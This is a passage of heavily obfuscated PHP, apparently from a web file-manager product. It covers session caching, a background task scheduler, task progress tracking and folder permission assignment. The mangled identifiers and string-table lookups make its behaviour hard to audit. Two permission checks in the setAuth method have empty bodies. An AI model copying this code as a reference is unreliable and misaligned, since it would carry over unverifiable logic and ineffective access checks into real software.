$°úÛß[$Ã¾ÜóåÛ]; $  ¯† = $°úÛß[$ÌÑ¡Åú§[857]]; switch ($Ã¾ÜóåÛ) { case $ÌÑ¡Åú§[21]: self::$handle = Model($ÌÑ¡Åú§[858]); break; case $ÌÑ¡Åú§[859]: self::$handle = new CacheRedis($ØÏ—¨Ş, $  ¯†); break; case $ÌÑ¡Åú§[860]: self::$handle = new CacheMemcached($ØÏ—¨Ş, $  ¯†); break; case $ÌÑ¡Åú§[216]: $ØÏ—¨Ş[$ÌÑ¡Åú§[86]] = $ØÏ—¨Ş[$ÌÑ¡Åú§[86]] . $ÌÑ¡Åú§[1638]; self::$handle = new CacheFile($ØÏ—¨Ş, $  ¯†); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÈñÂÜºƒ = new self(); return $ÈñÂÜºƒ; } public static function getBySign($……Òø¬ ) { $ÜÔ—œƒª = self::$handle->get($……Òø¬ ); $ÜÔ—œƒª = unserialize($ÜÔ—œƒª); return is_array($ÜÔ—œƒª) ? $ÜÔ—œƒª : array(); } public static function setBySign($øÎÜò£, $ìñö‚šâ) { CacheLock::lock($øÎÜò£); self::$handle->set($øÎÜò£, serialize($ìñö‚šâ), self::$sessionTime); CacheLock::unlock($øÎÜò£); } public static function sign($¬¹œ––À = false) { if ($¬¹œ––À) { self::$sessionSign = $¬¹œ––À; } self::init(); return self::$sessionSign; } public static function set($øæ±Íáã, $æíŞıŠÓ = false) { self::init(); if (is_array($øæ±Íáã)) { foreach ($øæ±Íáã as $ ¸Ëåõ” => $»Ï¦¤“£) { array_set_value(self::$data, $ ¸Ëåõ”, $»Ï¦¤“£); } } else { array_set_value(self::$data, $øæ±Íáã, $æíŞıŠÓ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ëò´—”• = false) { self::init(); if (!$Ëò´—”•) { return self::$data; } return array_get_value(self::$data, $Ëò´—”•); } public static function remove($ª³ä‘–¬) { self::init(); unset(self::$data[$ª³ä‘–¬]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ ÇƒŠìÀ][863])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÌåûÅÈƒ =& $_SERVER[ ÇƒŠìÀ]; if (self::valueGet($ÌåûÅÈƒ[779]) != $ÌåûÅÈƒ[90]) { return; } if (self::valueGet($ÌåûÅÈƒ[1639]) == $ÌåûÅÈƒ[90]) { $Æ¹¥Á²ç = self::valueGet($ÌåûÅÈƒ[1640]); if (time() - $Æ¹¥Á²ç > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ÌåûÅÈƒ[1639], $ÌåûÅÈƒ[90]); self::log($ÌåûÅÈƒ[1641] . ACTION . $ÌåûÅÈƒ[1642]); Hook::bind($ÌåûÅÈƒ[1643], $ÌåûÅÈƒ[1644]); $ó÷¬¢¾Â = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÌåûÅÈƒ[779]) != $ÌåûÅÈƒ[90]) { self::valueSet($ÌåûÅÈƒ[1639], $ÌåûÅÈƒ[214]); self::log($ÌåûÅÈƒ[1645]); die; } $¦Ü•ÈÈ‘ = time(); if ($¦Ü•ÈÈ‘ - $ó÷¬¢¾Â >= 60) { self::valueSet(array($ÌåûÅÈƒ[1639] => $ÌåûÅÈƒ[90], $ÌåûÅÈƒ[1640] => $¦Ü•ÈÈ‘)); $ó÷¬¢¾Â = $¦Ü•ÈÈ‘; } if (!file_exists(USER_SYSTEM . $ÌåûÅÈƒ[1646])) { self::valueSet(array($ÌåûÅÈƒ[1639] => $ÌåûÅÈƒ[214], $ÌåûÅÈƒ[779] => $ÌåûÅÈƒ[214])); self::log($ÌåûÅÈƒ[1647]); die; } $õòğ‰¦ƒ = file_get_contents(BASIC_PATH . $ÌåûÅÈƒ[1648]); $”âöò = KOD_VERSION . $ÌåûÅÈƒ[10] . KOD_VERSION_BUILD; $Ê¹÷ÜÙˆ = match_text($õòğ‰¦ƒ, $ÌåûÅÈƒ[1649]) . $ÌåûÅÈƒ[10] . match_text($õòğ‰¦ƒ, $ÌåûÅÈƒ[1650]); if ($Ê¹÷ÜÙˆ != $”âöò) { self::restart(); self::log("\163\164\157\x70\145\x64\56\133\x76\145\x72\163\151\x6f\156\x20\165\x70\x64\x61\x74\x65\x3b{$versionNow}\40\75\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ôå±á‰ =& $_SERVER[ ÇƒŠìÀ]; http_close(); $GLOBALS[$Ôå±á‰[1651]] = 1; $_SERVER[$Ôå±á‰[1652]] = $Ôå±á‰[1653]; $_COOKIE = array(); $GLOBALS[$Ôå±á‰[1654]] = 1; $GLOBALS[$Ôå±á‰[1655]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¼ÚòÏÁ =& $_SERVER[ ÇƒŠìÀ]; http_close(); self::valueSet($¼ÚòÏÁ[779], $¼ÚòÏÁ[214]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¼ÚòÏÁ[1639] => $¼ÚòÏÁ[214], $¼ÚòÏÁ[779] => $¼ÚòÏÁ[90])); self::log($¼ÚòÏÁ[1656]); } public static function taskSwitch() { $òÂÆ“«Å =& $_SERVER[ ÇƒŠìÀ]; $Ûùìí¸Ì = self::valueGet($òÂÆ“«Å[779]) == $òÂÆ“«Å[90] ? $òÂÆ“«Å[214] : $òÂÆ“«Å[90]; self::valueSet($òÂÆ“«Å[779], $Ûùìí¸Ì); } public static function shutdownEvent() { $£Ûå¢‚¨ =& $_SERVER[ ÇƒŠìÀ]; self::valueSet($£Ûå¢‚¨[1639], $£Ûå¢‚¨[214]); self::log($£Ûå¢‚¨[1657]); } public static function config($¹…¿â™, $ß£‚Ğ³) { self::valueSet($_SERVER[ ÇƒŠìÀ][779], $¹…¿â™); } private static function taskRunAll() { $“¨÷ì° =& $_SERVER[ ÇƒŠìÀ]; $³¡âòÖ = timeFloat(); $ÉıáÎİ€ = Model($“¨÷ì°[1658])->listData(); $¾­’Îûñ = count($ÉıáÎİ€); for ($õú¦°úÆ = 0; $õú¦°úÆ < $¾­’Îûñ; $õú¦°úÆ++) { $¶ö³Ò‰ê = $ÉıáÎİ€[$õú¦°úÆ]; if (!$¶ö³Ò‰ê[$“¨÷ì°[445]] || $¶ö³Ò‰ê[$“¨÷ì°[1659]] != $“¨÷ì°[90]) { continue; } if (!self::taskTimeCheck($¶ö³Ò‰ê)) { continue; } self::taskRun($¶ö³Ò‰ê); } Hook::trigger($“¨÷ì°[1660]); self::taskQueueRun($³¡âòÖ); } private static function taskQueueRun($›¦Í¦­) { $£îÍİĞà = 10; while (!0) { $ÆÌÍ„€ö = TaskQueue::run(); if ($ÆÌÍ„€ö === !1) { break; } if (timeFloat() - $›¦Í¦­ >= $£îÍİĞà) { break; } } } private static function taskTimeCheck($¾ã§ú¢ª) { $ˆ­øÄÏ® =& $_SERVER[ ÇƒŠìÀ]; $ãî¸×Ô = json_decode($¾ã§ú¢ª[$ˆ­øÄÏ®[196]], !0); $³êÊù«‘ = intval($¾ã§ú¢ª[$ˆ­øÄÏ®[1640]]); $ÃÕ½€¾œ = strtotime($ˆ­øÄÏ®[1661] . $ãî¸×Ô[$ˆ­øÄÏ®[1662]] . $ˆ­øÄÏ®[1663]) - strtotime($ˆ­øÄÏ®[1664]); $†‹¢ç¦… = time() - strtotime(date($ˆ­øÄÏ®[1665]) . $ˆ­øÄÏ®[1666]); $—è³çûš = $†‹¢ç¦… >= $ÃÕ½€¾œ && $†‹¢ç¦… <= $ÃÕ½€¾œ + 3600; switch ($ãî¸×Ô[$ˆ­øÄÏ®[33]]) { case $ˆ­øÄÏ®[1667]: if (time() - $³êÊù«‘ < 3600 * 24 * 30) { return !1; } if ($ãî¸×Ô[$ˆ­øÄÏ®[1667]] == date($ˆ­øÄÏ®[1668]) && $—è³çûš) { return !0; } break; case $ˆ­øÄÏ®[1669]: if (time() - $³êÊù«‘ < 3600 * 24 * 7) { return !1; } $§Â•´…‹ = date($ˆ­øÄÏ®[1670]) == 0 ? 7 : date($ˆ­øÄÏ®[1670]); if ($ãî¸×Ô[$ˆ­øÄÏ®[1669]] == $§Â•´…‹ && $—è³çûš) { return !0; } break; case $ˆ­øÄÏ®[1662]: if (time() - $³êÊù«‘ < 3600 * 24) { return !1; } if ($—è³çûš) { return !0; } break; case $ˆ­øÄÏ®[1671]: if (time() - $³êÊù«‘ >= floatval($ãî¸×Ô[$ˆ­øÄÏ®[1671]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $½ÅöÅî™ =& $_SERVER[ ÇƒŠìÀ]; static $§Ñ•Ş»İ = 0; $Â°À¤ó¶ = 300; if (!$§Ñ•Ş»İ) { $§Ñ•Ş»İ = time(); } if (time() - $§Ñ•Ş»İ < $Â°À¤ó¶) { return; } $§Ñ•Ş»İ = time(); $ñÇÈæÜ¥ = Model($½ÅöÅî™[548])->db($½ÅöÅî™[12]); if ($ñÇÈæÜ¥) { $ñÇÈæÜ¥->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($½ÅöÅî™[1672], $½ÅöÅî™[1673]); die; } } public static function taskRun($£ô»˜ô·) { $øç…›Ä‚ =& $_SERVER[ ÇƒŠìÀ]; self::log($øç…›Ä‚[1674] . $£ô»˜ô·[$øç…›Ä‚[445]] . $øç…›Ä‚[1675] . $£ô»˜ô·[$øç…›Ä‚[32]] . $øç…›Ä‚[1676] . $£ô»˜ô·[$øç…›Ä‚[1677]]); Model($øç…›Ä‚[1658])->run($£ô»˜ô·[$øç…›Ä‚[445]]); $ÄÃŸ¹Õ = timeFloat(); $Ä¤ü¡ù = $øç…›Ä‚[12]; switch ($£ô»˜ô·[$øç…›Ä‚[33]]) { case $øç…›Ä‚[353]: $®ÀİŒ‹İ = url_request($£ô»˜ô·[$øç…›Ä‚[1677]], $øç…›Ä‚[247], !1, !1, !1, !1, 10); if ($®ÀİŒ‹İ[$øç…›Ä‚[779]]) { $Ä¤ü¡ù = strlen($®ÀİŒ‹İ[$øç…›Ä‚[1237]]); } break; case $øç…›Ä‚[246]: $Ä¤ü¡ù = Hook::apply($£ô»˜ô·[$øç…›Ä‚[1677]]); default: break; } Model($øç…›Ä‚[1678])->add(array($øç…›Ä‚[1679] => $øç…›Ä‚[12], $øç…›Ä‚[1680] => $øç…›Ä‚[214], $øç…›Ä‚[33] => $øç…›Ä‚[1681] . $£ô»˜ô·[$øç…›Ä‚[445]], $øç…›Ä‚[1682] => json_encode(array($øç…›Ä‚[32] => $£ô»˜ô·[$øç…›Ä‚[32]], $øç…›Ä‚[1683] => timeFloat() - $ÄÃŸ¹Õ, $øç…›Ä‚[339] => $Ä¤ü¡ù)))); $Æäº”€› = $Ä¤ü¡ù ? $øç…›Ä‚[1684] . $Ä¤ü¡ù : $øç…›Ä‚[12]; self::log($øç…›Ä‚[1685] . $£ô»˜ô·[$øç…›Ä‚[445]] . $øç…›Ä‚[167] . $Æäº”€›); return !0; } public static function valueGet($Ï­Êôû—) { $œˆÑä†ß =& $_SERVER[ ÇƒŠìÀ]; $Òô½è˜ã = $œˆÑä†ß[1686]; $Ğí©Ññ  = Model($œˆÑä†ß[478])->get($Ï­Êôû—, $Òô½è˜ã); if (is_null($Ğí©Ññ )) { Model($œˆÑä†ß[478])->set($œˆÑä†ß[779], $œˆÑä†ß[90], $Òô½è˜ã); Model($œˆÑä†ß[478])->set($œˆÑä†ß[1639], $œˆÑä†ß[214], $Òô½è˜ã); $Ğí©Ññ  = Model($œˆÑä†ß[478])->get($Ï­Êôû—, $Òô½è˜ã); } return $Ğí©Ññ ; } private static function valueSet($ÛğÜÜ×¿, $«ß¶è¢„ = false) { $ş˜ÅÎÅÆ =& $_SERVER[ ÇƒŠìÀ]; $£Óèú­ô = $ş˜ÅÎÅÆ[1687]; CacheLock::lock($£Óèú­ô); $²ïõ¡Ãì = Model($ş˜ÅÎÅÆ[478])->set($ÛğÜÜ×¿, $«ß¶è¢„, $ş˜ÅÎÅÆ[1686]); CacheLock::unlock($£Óèú­ô); return $²ïõ¡Ãì; } protected static function log($ö¡™ÜÅ») { write_log($ö¡™ÜÅ», $_SERVER[ ÇƒŠìÀ][1673]); } private static function cacheClear() { $ûÈÌîà =& $_SERVER[ ÇƒŠìÀ]; Cache::clearMemory(Model($ûÈÌîà[478])->cacheKey($ûÈÌîà[1686])); Cache::clearMemory(Model($ûÈÌîà[478])->cacheKey($ûÈÌîà[1688])); Model($ûÈÌîà[1658])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Û²¶»Â, $ÚŸ³èí = '', $¯¦˜ıÌÄ = 0, $ôè‘ìĞ€ = '') { $¡ŠĞú• =& $_SERVER[ ÇƒŠìÀ]; if (self::get($Û²¶»Â)) { return; } $this->task = array($¡ŠĞú•[445] => $Û²¶»Â, $¡ŠĞú•[1689] => USER_ID, $¡ŠĞú•[1579] => $ôè‘ìĞ€, $¡ŠĞú•[496] => $¡ŠĞú•[12], $¡ŠĞú•[33] => $ÚŸ³èí, $¡ŠĞú•[1099] => $¡ŠĞú•[12], $¡ŠĞú•[815] => $¯¦˜ıÌÄ, $¡ŠĞú•[1690] => 0, $¡ŠĞú•[1691] => 0, $¡ŠĞú•[1692] => 0, $¡ŠĞú•[1693] => timeFloat(), $¡ŠĞú•[1694] => 0, $¡ŠĞú•[1695] => 0, $¡ŠĞú•[1696] => 0, $¡ŠĞú•[1697] => 0, $¡ŠĞú•[779] => $¡ŠĞú•[1639]); $GLOBALS[$¡ŠĞú•[1698]] = 1; Hook::bind($¡ŠĞú•[1643], array($this, $¡ŠĞú•[1699])); Hook::bind($¡ŠĞú•[1700], array($this, $¡ŠĞú•[1701])); $this->startAfter(); Hook::trigger($¡ŠĞú•[1702], $this->task); $this->task[$¡ŠĞú•[1695]] = timeFloat(); } public function end($†ü‰Æ¶â = '') { $ªÁ£èë  =& $_SERVER[ ÇƒŠìÀ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ªÁ£èë [1695]]) { self::valueSet($this->task[$ªÁ£èë [445]], !1); } $this->isEnd = !0; if ($†ü‰Æ¶â) { $this->task[$ªÁ£èë [496]] = $†ü‰Æ¶â; } self::log($ªÁ£èë [1703] . $this->task[$ªÁ£èë [445]] . $ªÁ£èë [1704] . sprintf($ªÁ£èë [880], timeFloat() - $this->task[$ªÁ£èë [1693]]) . $ªÁ£èë [1705]); Hook::unbind($ªÁ£èë [1643], array($this, $ªÁ£èë [1699])); Hook::unbind($ªÁ£èë [1700], array($this, $ªÁ£èë [1701])); $this->endAfter(); $Á’ãÜ = $this->task; $this->task = !1; Hook::trigger($ªÁ£èë [1706], $Á’ãÜ); } public function update($éï•À = 0, $»õ€¿ÀÏ = false) { $•ªÍ¯œ¶ =& $_SERVER[ ÇƒŠìÀ]; $ïâÖğ¦ñ =& $this->task; if (!$ïâÖğ¦ñ) { return; } $ïâÖğ¦ñ[$•ªÍ¯œ¶[1690]] += $éï•À; $ïâÖğ¦ñ[$•ªÍ¯œ¶[1694]] = timeFloat(); if ($ïâÖğ¦ñ[$•ªÍ¯œ¶[815]]) { if ($ïâÖğ¦ñ[$•ªÍ¯œ¶[815]] < $ïâÖğ¦ñ[$•ªÍ¯œ¶[1690]]) { $ïâÖğ¦ñ[$•ªÍ¯œ¶[815]] = $ïâÖğ¦ñ[$•ªÍ¯œ¶[1690]]; } $Œò…º¾­ = timeFloat() - $ïâÖğ¦ñ[$•ªÍ¯œ¶[1693]] - $ïâÖğ¦ñ[$•ªÍ¯œ¶[1696]]; if ($Œò…º¾­ <= 0) { $Œò…º¾­ = 0.001; } $ïâÖğ¦ñ[$•ªÍ¯œ¶[1691]] = $ïâÖğ¦ñ[$•ªÍ¯œ¶[1690]] / $ïâÖğ¦ñ[$•ªÍ¯œ¶[815]]; $ïâÖğ¦ñ[$•ªÍ¯œ¶[1692]] = $ïâÖğ¦ñ[$•ªÍ¯œ¶[1690]] / $Œò…º¾­; if ($ïâÖğ¦ñ[$•ªÍ¯œ¶[1691]] > 0) { $ïâÖğ¦ñ[$•ªÍ¯œ¶[1697]] = $Œò…º¾­ * (1 - $ïâÖğ¦ñ[$•ªÍ¯œ¶[1691]]) / $ïâÖğ¦ñ[$•ªÍ¯œ¶[1691]]; } $ïâÖğ¦ñ[$•ªÍ¯œ¶[1697]] = $ïâÖğ¦ñ[$•ªÍ¯œ¶[1697]] <= 0 ? 0 : $ïâÖğ¦ñ[$•ªÍ¯œ¶[1697]]; } $this->updateAfter(); $¾³Å…—² = 0.2; if (timeFloat() - $ïâÖğ¦ñ[$•ªÍ¯œ¶[1695]] < $¾³Å…—² && !$»õ€¿ÀÏ) { return; } $üò—ô§á = self::get($ïâÖğ¦ñ[$•ªÍ¯œ¶[445]]); $ä …´şé = $üò—ô§á[$•ªÍ¯œ¶[779]]; if ($ä …´şé == self::STATYS_KILL) { $¤Õø‡Á² = array($•ªÍ¯œ¶[1707] => LNG($•ªÍ¯œ¶[1708]), $•ªÍ¯œ¶[1247] => !1); Cache::set($•ªÍ¯œ¶[1709] . $this->task[$•ªÍ¯œ¶[445]], $¤Õø‡Á², 30); $this->onKill(); $this->end(); die; } else { if ($ä …´şé == self::STATYS_STOP) { $Î¥ñÒÉŠ = 2; $üò—ô§á[$•ªÍ¯œ¶[1696]] += $Î¥ñÒÉŠ; self::valueSet($ïâÖğ¦ñ[$•ªÍ¯œ¶[445]], $üò—ô§á); sleep($Î¥ñÒÉŠ); $this->update(); return; } } $ïâÖğ¦ñ[$•ªÍ¯œ¶[779]] = $ä …´şé ? $ä …´şé : $ïâÖğ¦ñ[$•ªÍ¯œ¶[779]]; $ïâÖğ¦ñ[$•ªÍ¯œ¶[1696]] = $üò—ô§á[$•ªÍ¯œ¶[1696]] ? $üò—ô§á[$•ªÍ¯œ¶[1696]] : 0; $ïâÖğ¦ñ[$•ªÍ¯œ¶[1695]] = timeFloat(); Hook::trigger($•ªÍ¯œ¶[1710], $ïâÖğ¦ñ); self::valueSet($ïâÖğ¦ñ[$•ªÍ¯œ¶[445]], $ïâÖğ¦ñ); } public function onKillSet($Ä¦Á€ï³, $…Òƒ·½İ = array()) { $this->onKillCall = array($Ä¦Á€ï³, $…Òƒ·½İ); } public function onKill() { $ùù½°ÑÆ =& $_SERVER[ ÇƒŠìÀ]; self::log($ùù½°ÑÆ[1703] . $this->task[$ùù½°ÑÆ[445]] . $ùù½°ÑÆ[1711]); Hook::trigger($ùù½°ÑÆ[1712], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ãû¼×´) { $¿·–ªÕı =& $_SERVER[ ÇƒŠìÀ]; Cache::set($¿·–ªÕı[1709] . $this->task[$¿·–ªÕı[445]], $Ãû¼×´, 60); return $Ãû¼×´; } public static function get($‡åìì¤«) { $Èü î–Î =& $_SERVER[ ÇƒŠìÀ]; $Ç’Áì¬Ö = self::valueGet($‡åìì¤«); if (is_array($Ç’Áì¬Ö) && $Ç’Áì¬Ö[$Èü î–Î[1713]]) { $ÍšºÛû = ActionApply($Ç’Áì¬Ö[$Èü î–Î[1713]], array($Ç’Áì¬Ö)); $Ç’Áì¬Ö = is_array($ÍšºÛû) ? $ÍšºÛû : $Ç’Áì¬Ö; } return $Ç’Áì¬Ö; } public static function listData() { $šÏ„ö›ß = self::valueGet(); return array_sort_by($šÏ„ö›ß, $_SERVER[ ÇƒŠìÀ][1693], !0); } public static function kill($Ì·ÚíÓÉ) { return self::changeStatus($Ì·ÚíÓÉ, self::STATYS_KILL); } public static function stop($§¸€ÊŞÂ) { return self::changeStatus($§¸€ÊŞÂ, self::STATYS_STOP); } public static function restart($ìÈĞã˜Ğ) { return self::changeStatus($ìÈĞã˜Ğ, self::STATYS_RUNNING); } public static function killAll() { $”ä½òèî =& $_SERVER[ ÇƒŠìÀ]; $ïÜŞ¯¯‹ = self::listData(); foreach ($ïÜŞ¯¯‹ as $…Âœ Î) { self::kill($…Âœ Î[$”ä½òèî[445]]); } sleep(2); foreach ($ïÜŞ¯¯‹ as $…Âœ Î) { self::valueSet($…Âœ Î[$”ä½òèî[445]], !1); } } private static function changeStatus($¦œÔÎ·, $¥×ÙÙì) { $Ò’î³ÔŸ =& $_SERVER[ ÇƒŠìÀ]; $³ÇßãÙ‚ = self::valueGet($¦œÔÎ·); if (!$³ÇßãÙ‚) { return !1; } $³ÇßãÙ‚[$Ò’î³ÔŸ[779]] = $¥×ÙÙì; self::valueSet($¦œÔÎ·, $³ÇßãÙ‚); self::log($Ò’î³ÔŸ[1714] . $³ÇßãÙ‚[$Ò’î³ÔŸ[445]] . $Ò’î³ÔŸ[1715] . $¥×ÙÙì); return !0; } public static function valueGet($„å¢‘İ = false) { $ø´éµŠ =& $_SERVER[ ÇƒŠìÀ]; if ($„å¢‘İ) { $Éö™¦ı = Model($ø´éµŠ[490])->where(array($ø´éµŠ[96] => $„å¢‘İ, $ø´éµŠ[33] => $ø´éµŠ[1106]))->find(); return $Éö™¦ı ? json_decode($Éö™¦ı[$ø´éµŠ[420]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($àæ¿¯ã = false) { $Á½™Öı× =& $_SERVER[ ÇƒŠìÀ]; $ùı€ïÇç = array($Á½™Öı×[33] => $Á½™Öı×[1106]); if ($àæ¿¯ã) { $ùı€ïÇç[$Á½™Öı×[1689]] = $àæ¿¯ã; } $ÄŠ‚³è = Model($Á½™Öı×[490])->where($ùı€ïÇç)->select(); $ÄŠ‚³è = $ÄŠ‚³è ? $ÄŠ‚³è : array(); foreach ($ÄŠ‚³è as $×’€¨ÌŞ => $­¬å»‚ƒ) { $ÄŠ‚³è[$×’€¨ÌŞ] = json_decode($­¬å»‚ƒ[$Á½™Öı×[420]], !0); } return $ÄŠ‚³è; } public static function valueSet($’¢„Çö, $ıæ‡òí) { $­çû€Ü— =& $_SERVER[ ÇƒŠìÀ]; if (!$ıæ‡òí) { return Model($­çû€Ü—[490])->where(array($­çû€Ü—[96] => $’¢„Çö, $­çû€Ü—[33] => $­çû€Ü—[1106]))->delete(); } $ÊÔˆßìü = json_encode($ıæ‡òí); if (!$ÊÔˆßìü) { ob_start(); var_dump($ıæ‡òí); $‹…„“Ú = ob_get_clean(); self::log($­çû€Ü—[1716] . json_encode_force($‹…„“Ú)); } if (!$’¢„Çö || !$ıæ‡òí[$­çû€Ü—[445]]) { return !1; } $ì×­—ŒÕ = array($­çû€Ü—[33] => $­çû€Ü—[1106], $­çû€Ü—[1689] => USER_ID, $­çû€Ü—[96] => $’¢„Çö, $­çû€Ü—[420] => $ÊÔˆßìü); $òœ·è·ñ = $­çû€Ü—[1717]; CacheLock::lock($òœ·è·ñ); Model($­çû€Ü—[490])->add($ì×­—ŒÕ, array(), !0); CacheLock::unlock($òœ·è·ñ); } public static function log($–‹±éäÕ) { if (!GLOBAL_DEBUG) { return; } write_log($–‹±éäÕ, $_SERVER[ ÇƒŠìÀ][1718]); } } goto dæŠ„±š’; A‹×ùÀ‘°ƒ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\145\137\141\165\164\150"; public function getAuth($êÑ‡ÚÔµ) { $ôŠŠ³öâ =& $_SERVER[ ÇƒŠìÀ]; $Ğõ’ˆ÷ = $this->sourceAuthSelect($êÑ‡ÚÔµ); $½¨·ë×İ = array(); $—ş…ƒÁ• = array(); $¤‹Ä°† = 2 << 25; foreach ($Ğõ’ˆ÷ as $³ÉÒ”‘ê) { $íÏûÒ›ë = Model($ôŠŠ³öâ[542])->listData($³ÉÒ”‘ê[$ôŠŠ³öâ[1991]]); if (!$íÏûÒ›ë) { continue; } $½¨·ë×İ[] = $³ÉÒ”‘ê; $Úñ¿òš = 0; if ($³ÉÒ”‘ê[$ôŠŠ³öâ[180]] == SourceModel::TYPE_GROUP) { $Úñ¿òš = $¤‹Ä°† * 2; } if ($³ÉÒ”‘ê[$ôŠŠ³öâ[180]] == SourceModel::TYPE_USER) { $Úñ¿òš = $¤‹Ä°†; } if ($³ÉÒ”‘ê[$ôŠŠ³öâ[180]] == SourceModel::TYPE_USER && $³ÉÒ”‘ê[$ôŠŠ³öâ[540]] == $ôŠŠ³öâ[214]) { $Úñ¿òš = 0; } $—ş…ƒÁ•[] = $íÏûÒ›ë[$ôŠŠ³öâ[457]] + $Úñ¿òš; } array_multisort($—ş…ƒÁ•, SORT_DESC, $½¨·ë×İ); return $½¨·ë×İ; } public function sourceAuthSelect($ÖÙ÷ŒÅ) { $ÊØûÓ©ë =& $_SERVER[ ÇƒŠìÀ]; static $’Ãá˜¨¸ = array(); $¬¾­¡Íı = is_array($ÖÙ÷ŒÅ) ? !1 : !0; if ($¬¾­¡Íı) { $ÖÙ÷ŒÅ = array($ÖÙ÷ŒÅ); } $±±Äö˜‘ = array(); foreach ($ÖÙ÷ŒÅ as $ÓØ¥êôÆ) { if (isset($’Ãá˜¨¸[$ÓØ¥êôÆ])) { $±±Äö˜‘[$ÓØ¥êôÆ] = $’Ãá˜¨¸[$ÓØ¥êôÆ]; } } if (count($±±Äö˜‘) == count($ÖÙ÷ŒÅ)) { return $¬¾­¡Íı ? $±±Äö˜‘[$ÖÙ÷ŒÅ[0]] : $±±Äö˜‘; } $Àªúí‡ = $ÊØûÓ©ë[2068]; $‚áÈ÷‰ú = array($ÊØûÓ©ë[183] => array($ÊØûÓ©ë[7], $ÖÙ÷ŒÅ)); $äËÔš¤¨ = $this->field($Àªúí‡)->order($ÊØûÓ©ë[445])->where($‚áÈ÷‰ú)->select(); $ôı£ŒÉ¥ = array_to_keyvalue_group($äËÔš¤¨, $ÊØûÓ©ë[183]); foreach ($ÖÙ÷ŒÅ as $ÓØ¥êôÆ) { $’Ãá˜¨¸[$ÓØ¥êôÆ] = $ôı£ŒÉ¥[$ÓØ¥êôÆ] ? $ôı£ŒÉ¥[$ÓØ¥êôÆ] : array(); } if ($¬¾­¡Íı) { return $äËÔš¤¨; } return $ôı£ŒÉ¥; } public function setAuth($Ã’Ë¦©, $ƒ¸úòˆ) { $üŠê¸³… =& $_SERVER[ ÇƒŠìÀ]; $é¿¹‹²‘ = Model($üŠê¸³…[1368])->sourceInfo($Ã’Ë¦©); if (!$é¿¹‹²‘) { return !1; } if ($é¿¹‹²‘[$üŠê¸³…[180]] != SourceModel::TYPE_GROUP) { return !1; } $ºÏëÛé¥ = 1; $À—ÂĞ¾¦ = $é¿¹‹²‘[$üŠê¸³…[540]]; if ($À—ÂĞ¾¦ != $ºÏëÛé¥) { $²¡˜”İ€ = array($üŠê¸³…[1887] => $À—ÂĞ¾¦); $Ì‘§úş = Model($üŠê¸³…[1977])->field($üŠê¸³…[1689])->where($²¡˜”İ€)->select(); $Ì‘§úş = array_to_keyvalue($Ì‘§úş, $üŠê¸³…[12], $üŠê¸³…[1689]); } $¢ŠÙü¼ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $æ¸»¦©ê = array(); foreach ($ƒ¸úòˆ as $êâ‚×Ù¢) { if (!in_array($êâ‚×Ù¢[$üŠê¸³…[180]], $¢ŠÙü¼)) { show_json(LNG($üŠê¸³…[2069]), !1); } if ($À—ÂĞ¾¦ != $ºÏëÛé¥) { if ($êâ‚×Ù¢[$üŠê¸³…[180]] == SourceModel::TYPE_GROUP) { } if ($êâ‚×Ù¢[$üŠê¸³…[540]] != 0 && !in_array($êâ‚×Ù¢[$üŠê¸³…[540]], $Ì‘§úş)) { } } if ($êâ‚×Ù¢[$üŠê¸³…[540]] == 0) { $êâ‚×Ù¢[$üŠê¸³…[180]] = SourceModel::TYPE_USER; } $æ¸»¦©ê[] = array($üŠê¸³…[183] => $Ã’Ë¦©, $üŠê¸³…[180] => intval($êâ‚×Ù¢[$üŠê¸³…[180]]), $üŠê¸³…[540] => intval($êâ‚×Ù¢[$üŠê¸³…[540]]), $üŠê¸³…[1991] => intval($êâ‚×Ù¢[$üŠê¸³…[1991]]) ? intval($êâ‚×Ù¢[$üŠê¸³…[1991]]) : 0, $üŠê¸³…[2051] => intval($êâ‚×Ù¢[$üŠê¸³…[2051]]) ? intval($êâ‚×Ù¢[$üŠê¸³…[2051]]) : -1); } $this->where(array($üŠê¸³…[461] => $Ã’Ë¦©))->delete(); $this->addAll($æ¸»¦©ê); return !0; } public function authClear($øÉúÄÁ) { $Ç»ì½‡ =& $_SERVER[ ÇƒŠìÀ]; $„şÂõˆ = Model($Ç»ì½‡[1368])->sourceInfo($øÉúÄÁ); $²× ÅŞÑ = array($øÉúÄÁ); if ($„şÂõˆ[$Ç»ì½‡[455]] == $Ç»ì½‡[90]) { $Çò­âï = array($Ç»ì½‡[622] => array($Ç»ì½‡[582], $„şÂõˆ[$Ç»ì½‡[555]] . $øÉúÄÁ . $Ç»ì½‡[583])); $²× ÅŞÑ = Model($Ç»ì½‡[1368])->field($Ç»ì½‡[461])->where($Çò­âï)->getField($Ç»ì½‡[183], !0); $²× ÅŞÑ[] = $øÉúÄÁ; } 